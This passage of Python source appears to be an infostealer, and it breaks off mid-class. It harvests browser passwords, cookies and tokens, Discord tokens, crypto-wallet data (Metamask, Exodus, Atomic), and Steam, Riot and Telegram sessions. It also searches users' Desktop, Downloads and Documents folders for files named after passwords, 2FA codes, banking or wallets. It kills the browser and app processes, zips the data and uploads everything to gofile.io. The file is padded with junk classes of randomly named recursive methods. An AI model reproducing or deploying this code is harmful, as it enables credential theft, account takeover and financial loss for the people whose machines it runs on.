    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def Z1pTh1ngs(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TR6st(C00k13)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["crpassw.txt", "crcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, P4sswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = TR6st(C00k13)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)

class NaZJsJLAoxfQNQyDSGWW:
    def __init__(self):
        self.__CWagNcjExiZz()
        self.__IJaVoNnzYOiAzEPwi()
        self.__SzabcYPXghFRGRu()
        self.__VZxKDrrMWmAWlCI()
        self.__nWdonuutDE()
        self.__GiFHjYPW()
        self.__RJBLzEXZpAGufmno()
        self.__kVzWMcxDmVsMrPS()
        self.__EkkcGIixb()
    def __CWagNcjExiZz(self, zBbjK, ZKTAIUtebxHlYi, jjKPcakjCVuDWNOObVr, HKYyZcagmzblWqxi):
        return self.__kVzWMcxDmVsMrPS()
    def __IJaVoNnzYOiAzEPwi(self, XDScGo, xnRucJd, uAgVsMRGrmszPoLN, pGmeuPwMnJvWYN, cHGrwHh):
        return self.__nWdonuutDE()
    def __SzabcYPXghFRGRu(self, jLiFbBOPx, vnZCJMwkZIZdrCCn, VSEyaF):
        return self.__kVzWMcxDmVsMrPS()
    def __VZxKDrrMWmAWlCI(self, swTWFkbBFtWBXXM, IPLQquNufDyamKNOu, ShaXhr, dpyxKzbGDpNRGBUZojjw):
        return self.__IJaVoNnzYOiAzEPwi()
    def __nWdonuutDE(self, xnYtDGEFYwnlsqlPq):
        return self.__EkkcGIixb()
    def __GiFHjYPW(self, GezneIswupQXPJvS, eYUXjnQoTQeOaotIoqE, kUvExmRHyY, VIqWKjSJArSdZRK, BbjBZvp, GdZWNAIMjofdGQz, rJQUBjoYXtTidQkit):
        return self.__IJaVoNnzYOiAzEPwi()
    def __RJBLzEXZpAGufmno(self, WGxIVlGFP, ldQGULcuRc, pARzesUjLMKC, AmsOgZxAjim, UVWLvUGnHPis, FXMCiXrJBkpdjRe):
        return self.__EkkcGIixb()
    def __kVzWMcxDmVsMrPS(self, xNoaSPMtQsZmyQGhNZy):
        return self.__RJBLzEXZpAGufmno()
    def __EkkcGIixb(self, lzFvEFHrDjhz, zBTHYIsqbDbjhxRhi):
        return self.__GiFHjYPW()
class KeZTHLdrOaSc:
    def __init__(self):
        self.__lLBuQMAmDAqddUKWh()
        self.__xiscLszwHiDFTubHvT()
        self.__xYJHvSeLqD()
        self.__bXLVRAcyrsHkHCudR()
        self.__YNIcoFqmD()
    def __lLBuQMAmDAqddUKWh(self, lFGZwlAoUXdkuCrMRI, iJkMo, UARqaboPG):
        return self.__bXLVRAcyrsHkHCudR()
    def __xiscLszwHiDFTubHvT(self, LTkhgYyshRtzpjlb, iFObLicbMCvdnCRVGWS, sRlpBrPVCs, YEvEmgFspR, VWNAbRSl, tTXSARi, gKJLFbRCncJAIZC):
        return self.__YNIcoFqmD()
    def __xYJHvSeLqD(self, GkueHBXePMFvoH, zWynYYQMvokeXcsLzC, pJbLCu, rrcmUVzVdsuiEjpnC, sxsLRZAfKjQDK, CtqzcVAyjWKgwga, dUXVMXaykMpm):
        return self.__bXLVRAcyrsHkHCudR()
    def __bXLVRAcyrsHkHCudR(self, qXVzRdBlksTF, XbHQEckJQUHA, drpVfLKkNhGcD):
        return self.__lLBuQMAmDAqddUKWh()
    def __YNIcoFqmD(self, mJgqWaeJqX):
        return self.__xYJHvSeLqD()

class kmZjjwLDL:
    def __init__(self):
        self.__PTWhoutRroIb()
        self.__pTxvkTnDXBx()
        self.__baYXnKMcqHFzn()
        self.__ydEcpUNkSE()
        self.__IoOpRJskRW()
        self.__pyCsIGtIEUSooLC()
        self.__eEfLHgLcwloTF()
        self.__ApTUepavGk()
        self.__ZlhrwoCHf()
        self.__mVIMGFhpmKwfrYp()
        self.__fuxmKIihLYWgQ()
    def __PTWhoutRroIb(self, rZUyADmtPyuFzjsuQPU, kZGpCoQjuw, FsGqBTZHu, gvtEFOLVvnYR):
        return self.__eEfLHgLcwloTF()
    def __pTxvkTnDXBx(self, ingAkhHkzSiLOof):
        return self.__pyCsIGtIEUSooLC()
    def __baYXnKMcqHFzn(self, hUaQd, ZowhcZSIsBfiHypAIyC, PVqsVOucoO, VRMXNNt, HFaeyZtmVTRy, WsiVxrzlreZOjkPXJgN):
        return self.__PTWhoutRroIb()
    def __ydEcpUNkSE(self, mRnoMUpJglMUMMsHXmi, PTvTQSxUPzRFX):
        return self.__baYXnKMcqHFzn()
    def __IoOpRJskRW(self, ikTpmwDKNBJyUZ):
        return self.__PTWhoutRroIb()
    def __pyCsIGtIEUSooLC(self, ViSIoviHjZSZVHRnIv, VQoPqGIyqdbCwe, AdpJiMeH, QlcLuUSCsLMKsaKdctr, tGqBTObdXbVq, wvHTgtjuZDgl, bEMMgUJoHn):
        return self.__fuxmKIihLYWgQ()
    def __eEfLHgLcwloTF(self, uLJUKjYWrLDkSbXKNlo, MPqnabv, PvPFhmXZtnAKo, RXQYdLNtMwCnV, NJEGsIdtyCmo, jQTwekqp):
        return self.__mVIMGFhpmKwfrYp()
    def __ApTUepavGk(self, lMZnIfEVBXGLH, KLBNMQ, sSQcthoFaia, ZkbtmmplqedP, TkRqSMzlBANqhLScVNKJ, bFAWeHus, JhpzfkFe):
        return self.__ZlhrwoCHf()
    def __ZlhrwoCHf(self, qlAMtc):
        return self.__mVIMGFhpmKwfrYp()
    def __mVIMGFhpmKwfrYp(self, MUcjIQJXUPmCYpa, YZhCZgvUjDcU, cizlGO, UsWojuzd, cHHacTtrWqV):
        return self.__eEfLHgLcwloTF()
    def __fuxmKIihLYWgQ(self, YKxosbexIyTHsYgHf, WkmvdwyStKiMLgbRdTG, oMGNpZwmHFJ, lRNlnLDKsMvfv, xhIvB, yWzzaI, AqzPgSMOo):
        return self.__baYXnKMcqHFzn()
class JqwpGyXKZZQWHftcvg:
    def __init__(self):
        self.__laewmrysUsN()
        self.__VAxlSGrjamkwxeOrpzyp()
        self.__nlitZceAia()
        self.__CxPFjvUyE()
        self.__qaLwuwuvEc()
        self.__MwityOxbTHCrqu()
        self.__JcTZWEDbcyrnBgFxKVm()
        self.__JrOOLgFlwpPhZyonqWiU()
        self.__LfJaCRSTstvopm()
        self.__ZLFJsLFAaYZDiwgwS()
    def __laewmrysUsN(self, ohjxYMlA, bKmoAWrKvjSTZWN, pxgJDdaSpBPLJCbtCWEM, YVmCcL, lgoWynzAVdD, VOQkoXWDOjhXeVuG):
        return self.__VAxlSGrjamkwxeOrpzyp()
    def __VAxlSGrjamkwxeOrpzyp(self, objPwehGnndCuvUfHGP, MSLHWVEnDnQKwmVsokQ, vMXOZTR, eNgGBRsHh, erBYjGRwVc):
        return self.__LfJaCRSTstvopm()
    def __nlitZceAia(self, qIDwKWGbJaSmPQcksEqh, EIUWbLjXrUgRcvNWmNG, yvFCfXjmTt, BPXjl, thinaWfE, XUHWRTOVehDdVVel, IFWeDbsXWUFUfu):
        return self.__MwityOxbTHCrqu()
    def __CxPFjvUyE(self, LZFKofpcBtdKyWMpw, ofsKDGUOsGw, DOkvzmNLIituHNj):
        return self.__nlitZceAia()
    def __qaLwuwuvEc(self, BipzMptKOJkKgsJO):
        return self.__MwityOxbTHCrqu()
    def __MwityOxbTHCrqu(self, FMjJzYFNd, GcDeJLGQtiBWvaYhLj, bzjFngCP):
        return self.__nlitZceAia()
    def __JcTZWEDbcyrnBgFxKVm(self, UXTQoybbxYQJhUxhrXeJ, rSWEUb, VjryVZAUCRMpwxx, GfROJKvyHEPvzlsuP, dcaMMzH):
        return self.__nlitZceAia()
    def __JrOOLgFlwpPhZyonqWiU(self, LSzLJfVdthstPjzI):
        return self.__nlitZceAia()
    def __LfJaCRSTstvopm(self, jYnBFS, JKtKzNRvOKMcYPZSmKkT, JhsdZvE, Nnmjqbd):
        return self.__LfJaCRSTstvopm()
    def __ZLFJsLFAaYZDiwgwS(self, ocCaGpAvIJ, ixgSztiuSOC, urJRyFtbNB, pmmVpRMAzqyVC, oyFfTtrNxbsYNxnSd, iEeooptVfLOeYEnkPQg):
        return self.__JcTZWEDbcyrnBgFxKVm()

class lJUdAJEFJELwmHHgmWWH:
    def __init__(self):
        self.__kSzfnrhfjRajSRFzf()
        self.__wHNFWUTbLEEcYx()
        self.__nnWICTWELvkKejal()
        self.__yyhsdOBGsahzDZE()
        self.__aNlqvfAprcHb()
        self.__UbAvplwujLblwMNSvy()
        self.__qCUTIyGFUlUOuVJTWq()
        self.__EcMfBhmOZTb()
        self.__ptXEzFwSkySLZEoW()
        self.__iILLpygOI()
    def __kSzfnrhfjRajSRFzf(self, COceNPAtULtZtHYQ, psqXbq):
        return self.__yyhsdOBGsahzDZE()
    def __wHNFWUTbLEEcYx(self, XlObFiomoQnuyiNRQ):
        return self.__ptXEzFwSkySLZEoW()
    def __nnWICTWELvkKejal(self, nPzaXJbpqsyhpVIYQYYK, PkApkqGuAJUQjCm, xKDhesoxth, zeWwd, LKJBhuhJMnrQQyyFXVF, qjQjPUOrUFuEthMe, ReolDtpgUSiNaxktrm):
        return self.__ptXEzFwSkySLZEoW()
    def __yyhsdOBGsahzDZE(self, xDuzvnGOoFyAoZv, SJWasyoS, okMsFuDlcRPJ, CuWYN, GIzEYfBrtaVUrnPen):
        return self.__kSzfnrhfjRajSRFzf()
    def __aNlqvfAprcHb(self, FXwQaRmMXCfT, hWSiSQTGKNPbcO, bvLGWn, YInhNqrUqq, PzqNjdCbjJSUNqQVI):
        return self.__iILLpygOI()
    def __UbAvplwujLblwMNSvy(self, yqqkKnoSLTaycR, OPUSmWYCrSJwXjKCBSaD, IXcksaXUmo, HdiLTuShxzXOfQ):
        return self.__nnWICTWELvkKejal()
    def __qCUTIyGFUlUOuVJTWq(self, liibdQgFO, GBCKud, JyaxJosvadGQJJH, FziIkGJjACuWuyIlJco, vGMpCkKLVAJtlsmzqb, vmuaJ):
        return self.__EcMfBhmOZTb()
    def __EcMfBhmOZTb(self, BRIEeoonhMuelKo, NxsqvcX, zIEGbwTqXOed, YJuuYan, ztuIjfxJWJ):
        return self.__EcMfBhmOZTb()
    def __ptXEzFwSkySLZEoW(self, KycfnFaIKVPPKPPECTp, tKawXMby, jpcGALoZIwSCjEojObiA):
        return self.__wHNFWUTbLEEcYx()
    def __iILLpygOI(self, CymRvX, WZDaRkXiEnuZxoCFoW, RjfIWshhAPzRuHQtVCB):
        return self.__aNlqvfAprcHb()
class jmuBfVARBQutBX:
    def __init__(self):
        self.__AHeQUitKwKdCOMWbjX()
        self.__HldGBUxYRoeMWiyQD()
        self.__tFmdIZibDzOk()
        self.__ydlBMeHkBO()
        self.__ZJOSCkbY()
        self.__CHSKzYbPoBOy()
        self.__YNPfpHmbSayFfePxQ()
        self.__bBYZPTrfaKg()
    def __AHeQUitKwKdCOMWbjX(self, zQHrVKCAXxIJuwgreJxk, LjtzAThpn, oahBD, KpNeeZtRUJSgWUJlieiF, UOfdmawyttL):
        return self.__CHSKzYbPoBOy()
    def __HldGBUxYRoeMWiyQD(self, GMCNrh):
        return self.__YNPfpHmbSayFfePxQ()
    def __tFmdIZibDzOk(self, RXBAhLMMpQrLGvRFXdyP, IKqvXaZjjZRBxmNBw, ddepHXENiIYkGAsgUBOY):
        return self.__AHeQUitKwKdCOMWbjX()
    def __ydlBMeHkBO(self, PNCutrZrfnXbr, vUhpKBZLHu):
        return self.__ydlBMeHkBO()
    def __ZJOSCkbY(self, TGPzlAIDDGOazP, SWUlnSSoyscFnAALogw, ERyfMkNUQZtS):
        return self.__tFmdIZibDzOk()
    def __CHSKzYbPoBOy(self, LyMfQirJLfEAWEfuakek, vRNzoAjEakKRjDASVc, YhxXEojQCOzeb):
        return self.__ZJOSCkbY()
    def __YNPfpHmbSayFfePxQ(self, TuTgsdQzDOHZ, zrCmTuRl):
        return self.__CHSKzYbPoBOy()
    def __bBYZPTrfaKg(self, byjAosDSTuAryWFFhG, ChVQKomMCMaK):
        return self.__ZJOSCkbY()
class xheCIpcPr:
    def __init__(self):
        self.__jWyPLvwzgxUhAt()
        self.__XQUjlAFPUgYXa()
        self.__PgAOmNpLnBbKg()
        self.__kadDPDFcjaoYbBpuPnAc()
        self.__uXheEYjqoDLSCoNDJfUF()
        self.__BurWNiAMSZmW()
        self.__HhvjFCtXsOrIPpz()
        self.__UDEhzmQcySjHoKfsM()
        self.__sVDEChCr()
        self.__PKlnyoCSScNdvIkiR()
        self.__HhGEHEnJnMrWBStxTamn()
        self.__JeSacFWbVhAVVe()
    def __jWyPLvwzgxUhAt(self, jSiedccURcbAPvjdU, gImAvubRFY, KXPaJlBw):
        return self.__jWyPLvwzgxUhAt()
    def __XQUjlAFPUgYXa(self, yBTjNZFznClHxPyZ, RmIuacaJqEuJONQmBi, WAfPCzjadKRGQQlER, pJeDZIgsfNFIAfdyfcpp, fbfJnQsDFwlZipKXula, uKHPZhNtlLVt):
        return self.__XQUjlAFPUgYXa()
    def __PgAOmNpLnBbKg(self, nJEfMvaqCfmqM, MNEpYZYwjTeTrto, vGwlx, KyvexWURdWMBhoorVv):
        return self.__JeSacFWbVhAVVe()
    def __kadDPDFcjaoYbBpuPnAc(self, RFJewetRVrohmzTUqa, agXyqNhv, sAHjbDIwCdZBVab, LlejpqDcy, lmAKPYK, HDvGGfYX, MGLvuGAF):
        return self.__HhvjFCtXsOrIPpz()
    def __uXheEYjqoDLSCoNDJfUF(self, gyNlyFIceipHPTMl, cezTCreu, BYciJrnFb):
        return self.__XQUjlAFPUgYXa()
    def __BurWNiAMSZmW(self, xRvORDMHAepiEETYFmp, jNEnUVTVIw, JBUYhHf, UcLkSoPqNZBLTXtN, inWgWwaGxHmxNvOCs, HPpEkqIasr):
        return self.__uXheEYjqoDLSCoNDJfUF()
    def __HhvjFCtXsOrIPpz(self, ceJZzDvrVWJ, yPKiDMBwnGCDQDp, QkcqEMsNCxtbB):
        return self.__BurWNiAMSZmW()
    def __UDEhzmQcySjHoKfsM(self, eApUP):
        return self.__uXheEYjqoDLSCoNDJfUF()
    def __sVDEChCr(self, mwUQlPFQMPG, EpMRBXAwIYA, vYMvWISrxVgipaEwrE, HpBElwGwTKSitX, JMNUrQgew):
        return self.__uXheEYjqoDLSCoNDJfUF()
    def __PKlnyoCSScNdvIkiR(self, xolXzJ, EmeuBeAScLdtmYLBD, beTrquhCgC):
        return self.__uXheEYjqoDLSCoNDJfUF()
    def __HhGEHEnJnMrWBStxTamn(self, RFFMgQxBoOsPBsDT, kxeVbyABnI, VgiImnTAQQRUhBHUzCZl, pdcBgvqxssSMURgYq):
        return self.__UDEhzmQcySjHoKfsM()
    def __JeSacFWbVhAVVe(self, AKLnXKGokTfYhWfrvT, gaiVTdsgMDFVXodRyF, VeshDabBlzyuEUfIKiII):
        return self.__JeSacFWbVhAVVe()

class akVWcGOVawo:
    def __init__(self):
        self.__bBtpRiAvmkjAYuLVhkj()
        self.__jfJUqHLHaG()
        self.__gTCIUTgWwVSG()
        self.__AJdCnYsdodcGgFSSnKE()
        self.__SIquFyiG()
        self.__EYfjJbIJpHDqcaQx()
        self.__xuGomBuvTavIA()
    def __bBtpRiAvmkjAYuLVhkj(self, NTRxCUY, qbfdHXCFwixVlhS, qRaLDHUvJAhBRwpHv):
        return self.__jfJUqHLHaG()
    def __jfJUqHLHaG(self, uJaOD, xXaDoGoJWiWBVJ):
        return self.__bBtpRiAvmkjAYuLVhkj()
    def __gTCIUTgWwVSG(self, CBrRuLeCUIx):
        return self.__bBtpRiAvmkjAYuLVhkj()
    def __AJdCnYsdodcGgFSSnKE(self, LAQAfyQsnjOVL, HyBRkHp, JjmYdiWYYaxJ, rgcunvuqWi, FoUFnrRh):
        return self.__EYfjJbIJpHDqcaQx()
    def __SIquFyiG(self, mvgUC, qXMjmQMly, lcUzTXykbsAHeJWRs, bHTttClDzLcBKgWEMXmY):
        return self.__gTCIUTgWwVSG()
    def __EYfjJbIJpHDqcaQx(self, IMTEcxwARtjiojeLAKkZ, tsrxIFfreYlXeuBHm, jCJjAPkLSoRAmL, XugVHVIemOTvpL):
        return self.__xuGomBuvTavIA()
    def __xuGomBuvTavIA(self, lvcZQQlbWRqpknzC, EvGWWN, CsHkPCpkfgGiYfr):
        return self.__EYfjJbIJpHDqcaQx()
class TyJiROEeDeXzCieZaR:
    def __init__(self):
        self.__XgmsrCcjavYOja()
        self.__joVkVICcPfRpB()
        self.__AvJCcEbjDtOgMf()
        self.__ZaCIwkdJtHSylqcyLy()
        self.__SJtslwTXO()
        self.__ndBORJyyUE()
        self.__BwGOeunvxOdnAqyangX()
        self.__pICOjIvoIbqvllaw()
        self.__BJMovzwqmInqTXD()
        self.__AOVsVpVEbNAZ()
    def __XgmsrCcjavYOja(self, kHaLMTrbkBV, bHWWn, bBQuBhbFaDsDqHL, TxJSDohdHIuGnoYadH):
        return self.__BwGOeunvxOdnAqyangX()
    def __joVkVICcPfRpB(self, VkcuYIZBEhp, XEHETI, WHMCFGBMmfhN, vYtAwGodwjHqEj, hNORSrzEGcSwsghcezuM, hfPzucHes):
        return self.__joVkVICcPfRpB()
    def __AvJCcEbjDtOgMf(self, ZVnYKobzhUzhwczLgrv, sqIwFhcSTaVmKUbo, yHuXFdGNTrbsGim, KFHmxlQdanqV, pNXmxcqEFBhEBNS, InsTpGIbJwLsVblLm):
        return self.__ndBORJyyUE()
    def __ZaCIwkdJtHSylqcyLy(self, vKXIrCb, SHBGBxbLYLCH):
        return self.__BJMovzwqmInqTXD()
    def __SJtslwTXO(self, pUeCqJSkrwkjo, SqxFGbmxzqtmzAm, xyseDyiAikVdKQfa, ZqprzDRujYfxamUS, XsOusq, HetxphohCFYtu, zswwSwq):
        return self.__BwGOeunvxOdnAqyangX()
    def __ndBORJyyUE(self, TqBRncBgo, HirwkvgMdknpCMaR, DUByOEn, GbLOictJUtRxCdm, cXQTplFKOjkHCJ, QuhFlmSQWGRoch, ZfZtdNkQmOoMJc):
        return self.__ndBORJyyUE()
    def __BwGOeunvxOdnAqyangX(self, JCyqge, MrOHRlI, NpyLpVDvrZmIcDsZle, ghDSUioLtZAmq, pQCuEEYJ, VrPEBKnpyoLcLkVSsfR, NEELnnUQQAsc):
        return self.__BwGOeunvxOdnAqyangX()
    def __pICOjIvoIbqvllaw(self, TOhFioCgZNfeewzHmtjn, LWnHh, UFGIMdXapUbjyb):
        return self.__SJtslwTXO()
    def __BJMovzwqmInqTXD(self, JQTAgngSyYlDuVoFYQ, DRojXSVucPm, czZJkFGhYISKkuTBnu, nBSZDiDNJxEwvLfX, ryPdwzJCJdDdDfMuv, fKuFIsVvuoBESyAA):
        return self.__ndBORJyyUE()
    def __AOVsVpVEbNAZ(self, qJSlHgRAlNFdpw, dDgABSZ, KSrOUF, oWHYBxgunrGT, PmrlCWk, NVPRxoEykiLJzJPwrJEJ, zhcXykotuapHEHuIm):
        return self.__joVkVICcPfRpB()
class pdAXnngTUtGPgFrhv:
    def __init__(self):
        self.__EyoIzdPqFZuK()
        self.__sThvchQNBMJXKERkuVy()
        self.__vVgCNenwIbkanrIEjAu()
        self.__aKcAijQrBmm()
        self.__oJsHzwlfDyJGKMNqsth()
        self.__cTPAgqhIZBdjnKwMotvb()
    def __EyoIzdPqFZuK(self, KgkYcdBRnte, mHHvJSgtaC, NcCPR):
        return self.__sThvchQNBMJXKERkuVy()
    def __sThvchQNBMJXKERkuVy(self, wMlnRzfFxJzKytH):
        return self.__EyoIzdPqFZuK()
    def __vVgCNenwIbkanrIEjAu(self, MMwKqWcFAHTNLCsIh):
        return self.__EyoIzdPqFZuK()
    def __aKcAijQrBmm(self, HhjUBb, OaQGyJbwoCDMytnqYZho, YhlcyjoctHVy, PGAjueKQ, YJCRUYQCbARvnZfhcR, yxReF, WbdHZ):
        return self.__vVgCNenwIbkanrIEjAu()
    def __oJsHzwlfDyJGKMNqsth(self, BhAoYbXx):
        return self.__EyoIzdPqFZuK()
    def __cTPAgqhIZBdjnKwMotvb(self, ZNVVKqyYidzneskcflI, GMMaUXGqI, lBOpBBqK, FlinQvfDEGWmieJo, NUEvzokygAsYnMPPEyZJ, FyOrjNMbFgNdTdpyyCTI):
        return self.__EyoIzdPqFZuK()
class nMDMeptijnoGMf:
    def __init__(self):
        self.__bsycmjOjWwDxCct()
        self.__PGwrPXSZJV()
